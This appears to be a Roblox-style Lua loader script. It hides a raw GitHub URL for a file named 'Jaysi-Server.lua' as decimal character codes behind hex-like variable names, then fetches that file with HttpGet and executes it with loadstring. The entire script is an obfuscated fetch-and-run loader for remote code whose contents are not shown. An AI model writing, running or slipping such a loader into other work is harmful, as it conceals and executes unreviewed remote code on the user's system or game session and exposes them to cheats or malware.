local _0x_01 = game
local _0x_02 = loadstring

local function _0x_03(...)
    local _t = {...}
    local _s = ""
    local _p = string.char
    for _i = 1, #_t do
        _s = _s .. _p(_t[_i])
    end
    return _s
end

local function _0x_04()
    local _a = {104,116,116,112,115,58,47,47}
    local _b = {114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47}
    local _c = {110,117,116,106,97,121,115,105,45,98,108,105,112,47}
    local _d = {74,65,89,83,73,45,83,67,82,73,80,84,46,68,101,118,47}
    local _e = {114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47}
    local _f = {74,97,121,115,105,45,83,101,114,118,101,114,46,108,117,97}
    
    local function _m(...)
        local t = {...}
        local res = {}
        for _, tbl in ipairs(t) do
            for _, v in ipairs(tbl) do
                table.insert(res, v)
            end
        end
        return _0x_03(unpack(res))
    end
    
    return _m(_a, _b, _c, _d, _e, _f)
end

_0x_02(_0x_01:HttpGet(_0x_04()))()
